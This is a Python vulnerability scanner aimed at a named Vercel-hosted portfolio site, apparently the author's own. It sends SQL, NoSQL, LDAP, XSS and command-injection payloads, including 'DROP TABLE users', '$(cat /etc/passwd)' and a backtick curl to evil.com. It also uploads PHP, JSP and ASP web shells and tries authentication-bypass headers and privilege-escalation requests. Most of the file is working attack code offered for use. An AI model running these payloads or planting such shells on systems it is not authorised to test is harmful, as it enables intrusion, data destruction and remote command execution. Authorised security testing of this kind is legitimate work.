#!/usr/bin/env python3
"""
Advanced Portfolio API Vulnerability Scanner
Tests all API endpoints and admin functions for security vulnerabilities
"""

import requests
import json
import time
import threading
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import hashlib
import random
import string

class PortfolioVulnScanner:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.results = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }
        
    def log(self, severity, message, details=None):
        """Log findings with severity levels"""
        finding = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'message': message,
            'details': details or {}
        }
        self.results[severity].append(finding)
        
        colors = {
            'critical': '\033[1;91m',  # Bright Red
            'high': '\033[0;91m',      # Red
            'medium': '\033[0;93m',    # Yellow
            'low': '\033[0;94m',       # Blue
            'info': '\033[0;92m'       # Green
        }
        
        reset = '\033[0m'
        print(f"{colors.get(severity, '')}{severity.upper()}: {message}{reset}")
        if details:
            print(f"    Details: {details}")

    def test_api_endpoints(self):
        """Comprehensive API endpoint testing"""
        print("\n=== API ENDPOINT VULNERABILITY TESTING ===")
        
        # Standard API endpoints
        endpoints = [
            '/api', '/api/auth', '/api/login', '/api/logout',
            '/api/admin', '/api/admin/login', '/api/admin/logout',
            '/api/contact', '/api/projects', '/api/users', '/api/profile',
            '/api/upload', '/api/media', '/api/settings', '/api/messages',
            '/api/analytics', '/api/stats', '/api/health', '/api/status',
            '/api/v1', '/api/v2', '/graphql', '/api/graphql'
        ]
        
        # Test each endpoint with multiple methods
        for endpoint in endpoints:
            self._test_endpoint_methods(endpoint)
            
        # Test API versioning vulnerabilities
        self._test_api_versioning()
        
        # Test GraphQL introspection
        self._test_graphql_introspection()

    def _test_endpoint_methods(self, endpoint):
        """Test HTTP methods on each endpoint"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE']
        
        for method in methods:
            try:
                response = self.session.request(method, f"{self.target}{endpoint}", timeout=5)
                
                # Check for interesting responses
                if response.status_code == 200 and method in ['DELETE', 'PUT', 'PATCH']:
                    self.log('high', f"Dangerous HTTP method allowed: {method} {endpoint}", 
                            {'status': response.status_code, 'size': len(response.text)})
                
                elif response.status_code == 405 and 'Allow' in response.headers:
                    allowed_methods = response.headers['Allow']
                    if any(danger in allowed_methods for danger in ['DELETE', 'PUT', 'PATCH']):
                        self.log('medium', f"Dangerous methods exposed: {endpoint}", 
                                {'allowed_methods': allowed_methods})
                
                elif method == 'TRACE' and response.status_code == 200:
                    self.log('medium', f"HTTP TRACE method enabled: {endpoint}", 
                            {'trace_response': response.text[:200]})
                            
                elif method == 'OPTIONS' and response.status_code == 200:
                    cors_headers = {k: v for k, v in response.headers.items() if 'cors' in k.lower() or 'access-control' in k.lower()}
                    if cors_headers:
                        self.log('info', f"CORS headers found: {endpoint}", cors_headers)
                        
            except Exception as e:
                continue

    def _test_api_versioning(self):
        """Test for API versioning vulnerabilities"""
        versions = ['v1', 'v2', 'v3', 'beta', 'test', 'dev', 'staging']
        
        for version in versions:
            try:
                response = self.session.get(f"{self.target}/api/{version}", timeout=5)
                if response.status_code == 200:
                    self.log('info', f"API version discovered: /api/{version}", 
                            {'status': response.status_code})
                    
                    # Test for version-specific vulnerabilities
                    if version in ['dev', 'test', 'staging']:
                        self.log('medium', f"Development API version exposed: /api/{version}", 
                                {'warning': 'May contain debug features'})
                        
            except Exception:
                continue

    def _test_graphql_introspection(self):
        """Test GraphQL introspection queries"""
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql']
        
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    subscriptionType { name }
                    types {
                        ...FullType
                    }
                }
            }
            fragment FullType on __Type {
                kind
                name
                description
                fields(includeDeprecated: true) {
                    name
                    description
                }
            }
            """
        }
        
        for endpoint in graphql_endpoints:
            try:
                response = self.session.post(f"{self.target}{endpoint}", 
                                           json=introspection_query, timeout=10)
                if response.status_code == 200 and 'data' in response.text:
                    self.log('high', f"GraphQL introspection enabled: {endpoint}", 
                            {'schema_exposed': True})
                            
            except Exception:
                continue

    def test_admin_functions(self):
        """Comprehensive admin function testing"""
        print("\n=== ADMIN FUNCTION VULNERABILITY TESTING ===")
        
        # Admin endpoints
        admin_endpoints = [
            '/admin', '/admin/login', '/admin/dashboard', '/admin/users',
            '/admin/projects', '/admin/hero', '/admin/about', '/admin/skills',
            '/admin/contact', '/admin/messages', '/admin/media', '/admin/upload',
            '/admin/settings', '/admin/analytics', '/admin/logs', '/admin/backup'
        ]
        
        # Test direct access
        self._test_admin_direct_access(admin_endpoints)
        
        # Test admin login bypass
        self._test_admin_login_bypass()
        
        # Test privilege escalation
        self._test_privilege_escalation()
        
        # Test admin CSRF
        self._test_admin_csrf(admin_endpoints)

    def _test_admin_direct_access(self, endpoints):
        """Test direct access to admin functions"""
        for endpoint in endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=5)
                
                # Check for admin content without authentication
                admin_keywords = ['admin', 'dashboard', 'management', 'control panel']
                auth_keywords = ['login', 'sign in', 'authenticate', 'unauthorized']
                
                content = response.text.lower()
                
                if response.status_code == 200:
                    has_admin_content = any(keyword in content for keyword in admin_keywords)
                    has_auth_protection = any(keyword in content for keyword in auth_keywords)
                    
                    if has_admin_content and not has_auth_protection:
                        self.log('critical', f"Admin panel accessible without authentication: {endpoint}",
                                {'status': response.status_code, 'size': len(response.text)})
                    elif has_admin_content:
                        self.log('info', f"Admin panel found with protection: {endpoint}")
                        
                elif response.status_code in [401, 403]:
                    self.log('info', f"Admin panel properly protected: {endpoint}")
                    
            except Exception:
                continue

    def _test_admin_login_bypass(self):
        """Test various admin login bypass techniques"""
        login_endpoint = '/admin/login'
        
        # Test 1: SQL injection in login
        sql_payloads = [
            {"email": "admin' OR '1'='1' --", "password": "test"},
            {"email": "admin'/*", "password": "*/OR/*", "comment": "*/1=1"},
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": "admin", "password": {"$gt": ""}},
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.post(f"{self.target}{login_endpoint}", 
                                           json=payload, timeout=5)
                
                # Check for successful login indicators
                success_indicators = ['welcome', 'dashboard', 'success', 'token', 'jwt']
                if any(indicator in response.text.lower() for indicator in success_indicators):
                    self.log('critical', f"SQL injection bypass successful: {login_endpoint}",
                            {'payload': str(payload), 'status': response.status_code})
                    
            except Exception:
                continue
        
        # Test 2: Authentication bypass headers
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"Client-IP": "127.0.0.1"},
            {"X-Admin": "true"},
            {"X-Auth": "admin"},
            {"Authorization": "Bearer admin"},
        ]
        
        for headers in bypass_headers:
            try:
                response = self.session.post(f"{self.target}{login_endpoint}",
                                           json={"email": "admin", "password": "admin"},
                                           headers=headers, timeout=5)
                
                if response.status_code not in [401, 403]:
                    self.log('high', f"Authentication bypass with headers: {login_endpoint}",
                            {'headers': headers, 'status': response.status_code})
                            
            except Exception:
                continue

    def _test_privilege_escalation(self):
        """Test for privilege escalation vulnerabilities"""
        # Test user role manipulation
        user_endpoints = ['/api/users', '/api/admin/users', '/api/profile']
        
        escalation_payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"permissions": ["admin", "read", "write", "delete"]},
            {"user_type": "administrator"},
            {"access_level": 9999}
        ]
        
        for endpoint in user_endpoints:
            for payload in escalation_payloads:
                try:
                    response = self.session.post(f"{self.target}{endpoint}", 
                                               json=payload, timeout=5)
                    
                    if response.status_code in [200, 201]:
                        self.log('high', f"Potential privilege escalation: {endpoint}",
                                {'payload': payload, 'status': response.status_code})
                                
                except Exception:
                    continue

    def _test_admin_csrf(self, endpoints):
        """Test for CSRF vulnerabilities in admin functions"""
        for endpoint in endpoints:
            try:
                # Test without CSRF token
                response = self.session.post(f"{self.target}{endpoint}",
                                           json={"test": "csrf"}, 
                                           headers={"Origin": "https://evil.com"},
                                           timeout=5)
                
                if response.status_code == 200:
                    self.log('medium', f"Potential CSRF vulnerability: {endpoint}",
                            {'origin_bypass': True})
                            
            except Exception:
                continue

    def test_injection_vulnerabilities(self):
        """Comprehensive injection testing"""
        print("\n=== INJECTION VULNERABILITY TESTING ===")
        
        # Test SQL injection
        self._test_sql_injection()
        
        # Test NoSQL injection
        self._test_nosql_injection()
        
        # Test XSS
        self._test_xss_vulnerabilities()
        
        # Test Command injection
        self._test_command_injection()
        
        # Test LDAP injection
        self._test_ldap_injection()

    def _test_sql_injection(self):
        """Advanced SQL injection testing"""
        endpoints = ['/api/contact', '/api/projects', '/admin/login', '/api/search']
        
        sql_payloads = [
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "' UNION SELECT @@version --",
            "' AND (SELECT pg_sleep(5)) --",
            "admin'/**/OR/**/1=1--",
            "' OR 1=1 LIMIT 1 OFFSET 1 --",
            "' UNION SELECT NULL,NULL,NULL --",
            "1' AND (SELECT * FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
            "'; INSERT INTO users VALUES('hacker','pass') --",
            "admin' OR (SELECT 1 FROM dual WHERE 1=1) --"
        ]
        
        for endpoint in endpoints:
            for payload in sql_payloads:
                try:
                    # Test in different parameters
                    test_data = {
                        "email": payload,
                        "name": payload,
                        "message": payload,
                        "search": payload,
                        "id": payload
                    }
                    
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=test_data, timeout=10)
                    
                    # Check for SQL errors
                    error_indicators = [
                        'sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle',
                        'syntax error', 'query failed', 'database error',
                        'column', 'table', 'constraint', 'foreign key'
                    ]
                    
                    response_text = response.text.lower()
                    for indicator in error_indicators:
                        if indicator in response_text:
                            self.log('high', f"SQL injection error detected: {endpoint}",
                                    {'payload': payload, 'error': indicator})
                            break
                    
                    # Check for time-based injection
                    if 'pg_sleep' in payload and response.elapsed.total_seconds() > 4:
                        self.log('critical', f"Time-based SQL injection: {endpoint}",
                                {'payload': payload, 'delay': response.elapsed.total_seconds()})
                        
                except Exception:
                    continue

    def _test_nosql_injection(self):
        """NoSQL injection testing"""
        endpoints = ['/api/contact', '/admin/login', '/api/projects']
        
        nosql_payloads = [
            {"$ne": ""},
            {"$regex": ".*"},
            {"$exists": True},
            {"$gt": ""},
            {"$where": "function(){return true}"},
            {"$or": [{"a": "a"}, {"b": "b"}]},
            {"$nin": [""]},
            {"$size": 1}
        ]
        
        for endpoint in endpoints:
            for payload in nosql_payloads:
                try:
                    test_data = {
                        "email": payload,
                        "password": payload,
                        "name": payload
                    }
                    
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=test_data, timeout=5)
                    
                    # Check for unusual responses
                    if response.status_code not in [400, 401, 422]:
                        self.log('medium', f"NoSQL injection potential: {endpoint}",
                                {'payload': str(payload), 'status': response.status_code})
                                
                except Exception:
                    continue

    def _test_xss_vulnerabilities(self):
        """Cross-site scripting testing"""
        endpoints = ['/api/contact', '/api/projects', '/admin/hero', '/admin/about']
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            'javascript:alert("XSS")',
            '<script src="data:text/javascript,alert(\'XSS\')"></script>',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>">'
        ]
        
        for endpoint in endpoints:
            for payload in xss_payloads:
                try:
                    test_data = {
                        "name": payload,
                        "title": payload,
                        "description": payload,
                        "message": payload,
                        "content": payload
                    }
                    
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=test_data, timeout=5)
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        self.log('high', f"Reflected XSS vulnerability: {endpoint}",
                                {'payload': payload})
                    
                    # Store payload for stored XSS testing
                    if response.status_code in [200, 201]:
                        # Try to retrieve and check for stored XSS
                        get_response = self.session.get(f"{self.target}{endpoint}", timeout=5)
                        if payload in get_response.text:
                            self.log('critical', f"Stored XSS vulnerability: {endpoint}",
                                    {'payload': payload})
                            
                except Exception:
                    continue

    def _test_command_injection(self):
        """Command injection testing"""
        endpoints = ['/api/contact', '/api/upload', '/admin/settings']
        
        command_payloads = [
            '; ls',
            '| whoami',
            '`id`',
            '$(cat /etc/passwd)',
            '; ping -c 4 127.0.0.1',
            '&& echo vulnerable',
            '|| echo vulnerable',
            '; cat /etc/hosts',
            '`curl http://evil.com`'
        ]
        
        for endpoint in endpoints:
            for payload in command_payloads:
                try:
                    test_data = {
                        "filename": payload,
                        "path": payload,
                        "command": payload,
                        "name": payload
                    }
                    
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=test_data, timeout=10)
                    
                    # Check for command output
                    command_indicators = [
                        'root:x:', 'usr/bin', 'localhost', '127.0.0.1',
                        'uid=', 'gid=', 'groups=', 'vulnerable'
                    ]
                    
                    for indicator in command_indicators:
                        if indicator in response.text:
                            self.log('critical', f"Command injection detected: {endpoint}",
                                    {'payload': payload, 'output': indicator})
                            break
                            
                except Exception:
                    continue

    def _test_ldap_injection(self):
        """LDAP injection testing"""
        endpoints = ['/api/auth', '/admin/login', '/api/users']
        
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*)(uid=*))(|(uid=*",
            "admin)(|(cn=*))"
        ]
        
        for endpoint in endpoints:
            for payload in ldap_payloads:
                try:
                    test_data = {
                        "username": payload,
                        "email": payload,
                        "filter": payload
                    }
                    
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=test_data, timeout=5)
                    
                    # Check for LDAP errors or unusual responses
                    ldap_indicators = ['ldap', 'distinguished name', 'invalid dn']
                    
                    for indicator in ldap_indicators:
                        if indicator in response.text.lower():
                            self.log('medium', f"LDAP injection potential: {endpoint}",
                                    {'payload': payload})
                            break
                            
                except Exception:
                    continue

    def test_file_upload_vulnerabilities(self):
        """File upload security testing"""
        print("\n=== FILE UPLOAD VULNERABILITY TESTING ===")
        
        upload_endpoints = ['/api/upload', '/admin/upload', '/api/media', '/admin/media']
        
        # Create malicious files
        malicious_files = {
            'shell.php': '<?php system($_GET["cmd"]); ?>',
            'xss.html': '<script>alert("XSS")</script>',
            'shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'shell.asp': '<%eval request("cmd")%>',
            'shell.py': 'import os; os.system(request.GET["cmd"])',
            'malicious.svg': '''<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
<rect width="100" height="100" fill="red"/>
</svg>''',
            'fake.gif': 'GIF89a<script>alert("XSS")</script>',
            'shell.phtml': '<?php system($_GET["cmd"]); ?>',
            'shell.php5': '<?php system($_GET["cmd"]); ?>',
            'shell.inc': '<?php system($_GET["cmd"]); ?>'
        }
        
        for endpoint in upload_endpoints:
            for filename, content in malicious_files.items():
                try:
                    files = {'file': (filename, content, 'application/octet-stream')}
                    response = self.session.post(f"{self.target}{endpoint}", 
                                               files=files, timeout=10)
                    
                    if response.status_code in [200, 201]:
                        self.log('high', f"Malicious file upload accepted: {endpoint}",
                                {'filename': filename, 'status': response.status_code})
                        
                        # Check if file is accessible
                        if 'path' in response.text or 'url' in response.text:
                            self.log('critical', f"Uploaded file may be accessible: {endpoint}",
                                    {'filename': filename, 'response': response.text[:200]})
                    
                    # Test double extension bypass
                    double_ext_name = filename.replace('.', '.jpg.')
                    files = {'file': (double_ext_name, content, 'image/jpeg')}
                    response = self.session.post(f"{self.target}{endpoint}",
                                               files=files, timeout=10)
                    
                    if response.status_code in [200, 201]:
                        self.log('medium', f"Double extension bypass: {endpoint}",
                                {'filename': double_ext_name})
                        
                except Exception:
                    continue

    def test_business_logic_vulnerabilities(self):
        """Business logic vulnerability testing"""
        print("\n=== BUSINESS LOGIC VULNERABILITY TESTING ===")
        
        # Test rate limiting
        self._test_rate_limiting()
        
        # Test race conditions
        self._test_race_conditions()
        
        # Test input validation bypass
        self._test_input_validation_bypass()
        
        # Test workflow bypass
        self._test_workflow_bypass()

    def _test_rate_limiting(self):
        """Test rate limiting implementation"""
        sensitive_endpoints = ['/admin/login', '/api/contact', '/api/auth']
        
        for endpoint in sensitive_endpoints:
            start_time = time.time()
            responses = []
            
            for i in range(50):  # Send 50 requests rapidly
                try:
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json={"test": f"rate_limit_{i}"},
                                               timeout=2)
                    responses.append(response.status_code)
                    
                    if response.status_code == 429:  # Rate limited
                        self.log('info', f"Rate limiting detected: {endpoint}",
                                {'requests_before_limit': i+1})
                        break
                        
                except Exception:
                    continue
            
            # Check if no rate limiting was implemented
            if 429 not in responses and len(responses) > 30:
                self.log('medium', f"No rate limiting detected: {endpoint}",
                        {'total_requests': len(responses)})

    def _test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        def make_request(endpoint, data):
            try:
                return self.session.post(f"{self.target}{endpoint}", json=data, timeout=5)
            except:
                return None
        
        # Test concurrent admin operations
        endpoint = '/admin/projects'
        test_data = {"name": "Race Test", "description": "Testing race conditions"}
        
        # Send 10 concurrent requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request, endpoint, test_data) for _ in range(10)]
            responses = [f.result() for f in futures if f.result()]
        
        success_count = sum(1 for r in responses if r.status_code in [200, 201])
        if success_count > 1:
            self.log('medium', f"Potential race condition: {endpoint}",
                    {'successful_concurrent_operations': success_count})

    def _test_input_validation_bypass(self):
        """Test input validation bypass"""
        endpoints = ['/api/contact', '/admin/projects']
        
        bypass_payloads = [
            {"name": None, "email": "test@test.com"},
            {"name": "", "email": "test@test.com"},
            {"name": "A" * 10000, "email": "test@test.com"},
            {"name": 123, "email": "test@test.com"},
            {"name": [], "email": "test@test.com"},
            {"name": {}, "email": "test@test.com"},
            {"name": "test", "email": "invalid-email"},
            {"name": "test", "email": ""},
        ]
        
        for endpoint in endpoints:
            for payload in bypass_payloads:
                try:
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=payload, timeout=5)
                    
                    if response.status_code in [200, 201]:
                        self.log('medium', f"Input validation bypass: {endpoint}",
                                {'payload': str(payload)})
                                
                except Exception:
                    continue

    def _test_workflow_bypass(self):
        """Test business workflow bypass"""
        # Test admin access without proper authentication flow
        admin_endpoints = ['/admin/dashboard', '/admin/settings']
        
        # Try to access admin functions directly
        for endpoint in admin_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=5)
                
                if response.status_code == 200:
                    admin_content = any(keyword in response.text.lower() 
                                      for keyword in ['admin', 'dashboard', 'manage'])
                    
                    if admin_content:
                        self.log('critical', f"Workflow bypass - admin access without auth: {endpoint}")
                        
            except Exception:
                continue

    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        print("\n=== INFORMATION DISCLOSURE TESTING ===")
        
        # Sensitive files
        sensitive_files = [
            '/.env', '/.env.local', '/.env.production',
            '/package.json', '/yarn.lock', '/package-lock.json',
            '/.git/config', '/.git/HEAD', '/.gitignore',
            '/webpack.config.js', '/vite.config.js', '/tsconfig.json',
            '/vercel.json', '/.vercel', '/web.config',
            '/config.json', '/app.json', '/manifest.json',
            '/backup', '/backup.zip', '/database.sql',
            '/.DS_Store', '/.htaccess', '/robots.txt',
            '/sitemap.xml', '/crossdomain.xml', '/clientaccesspolicy.xml'
        ]
        
        for file_path in sensitive_files:
            try:
                response = self.session.get(f"{self.target}{file_path}", timeout=5)
                
                if response.status_code == 200 and len(response.text) > 10:
                    # Check if it's actually sensitive content
                    sensitive_keywords = [
                        'password', 'secret', 'key', 'token', 'api_key',
                        'database_url', 'connection_string', 'private_key'
                    ]
                    
                    content_lower = response.text.lower()
                    if any(keyword in content_lower for keyword in sensitive_keywords):
                        self.log('critical', f"Sensitive information exposed: {file_path}",
                                {'size': len(response.text)})
                    else:
                        self.log('info', f"File exposed: {file_path}",
                                {'size': len(response.text)})
                        
            except Exception:
                continue
        
        # Test for directory listing
        directories = ['/', '/admin', '/api', '/assets', '/static', '/uploads']
        
        for directory in directories:
            try:
                response = self.session.get(f"{self.target}{directory}", timeout=5)
                
                if 'index of' in response.text.lower() or 'directory listing' in response.text.lower():
                    self.log('medium', f"Directory listing enabled: {directory}")
                    
            except Exception:
                continue

    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        report_file = f"portfolio_vuln_report_{timestamp}.md"
        
        total_findings = sum(len(findings) for findings in self.results.values())
        
        report = f"""# Portfolio Application Vulnerability Assessment Report

**Target:** {self.target}
**Scan Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}
**Total Findings:** {total_findings}

## Executive Summary

This report contains the results of a comprehensive security assessment of the portfolio application.

### Severity Distribution
- 🔴 **Critical:** {len(self.results['critical'])} findings
- 🟠 **High:** {len(self.results['high'])} findings  
- 🟡 **Medium:** {len(self.results['medium'])} findings
- 🔵 **Low:** {len(self.results['low'])} findings
- 🟢 **Informational:** {len(self.results['info'])} findings

## Detailed Findings

"""
        
        severity_emojis = {
            'critical': '🔴',
            'high': '🟠', 
            'medium': '🟡',
            'low': '🔵',
            'info': '🟢'
        }
        
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            if self.results[severity]:
                report += f"\n### {severity_emojis[severity]} {severity.upper()} Findings\n\n"
                
                for i, finding in enumerate(self.results[severity], 1):
                    report += f"#### {severity.upper()}-{i:02d}: {finding['message']}\n\n"
                    report += f"**Timestamp:** {finding['timestamp']}\n\n"
                    
                    if finding['details']:
                        report += "**Details:**\n"
                        for key, value in finding['details'].items():
                            report += f"- {key}: `{value}`\n"
                        report += "\n"
                    
                    report += "---\n\n"
        
        report += """
## Recommendations

### Immediate Actions Required
1. Fix all CRITICAL vulnerabilities immediately
2. Address HIGH severity issues within 24-48 hours
3. Plan remediation for MEDIUM severity issues

### Security Best Practices
1. Implement proper input validation
2. Use parameterized queries for database operations
3. Add proper authentication and authorization
4. Implement rate limiting
5. Use security headers
6. Regular security assessments

## Conclusion

This assessment identified multiple security vulnerabilities that should be addressed promptly.
Critical and high-severity issues pose immediate risks and require urgent attention.

---
*Report generated by Portfolio Vulnerability Scanner*
"""
        
        with open(report_file, 'w') as f:
            f.write(report)
            
        print(f"\n📄 Report generated: {report_file}")
        return report_file

def main():
    target_url = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
    
    print("🔥 ADVANCED PORTFOLIO VULNERABILITY SCANNER")
    print(f"🎯 Target: {target_url}")
    print(f"⏰ Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    
    scanner = PortfolioVulnScanner(target_url)
    
    try:
        # Run all tests
        scanner.test_api_endpoints()
        scanner.test_admin_functions() 
        scanner.test_injection_vulnerabilities()
        scanner.test_file_upload_vulnerabilities()
        scanner.test_business_logic_vulnerabilities()
        scanner.test_information_disclosure()
        
        # Generate report
        report_file = scanner.generate_report()
        
        print("\n" + "=" * 60)
        print("🎉 VULNERABILITY SCAN COMPLETED")
        print(f"📊 Total Findings: {sum(len(findings) for findings in scanner.results.values())}")
        print(f"📄 Report: {report_file}")
        
    except KeyboardInterrupt:
        print("\n⚠️  Scan interrupted by user")
    except Exception as e:
        print(f"\n❌ Error during scan: {e}")

if __name__ == "__main__":
    main()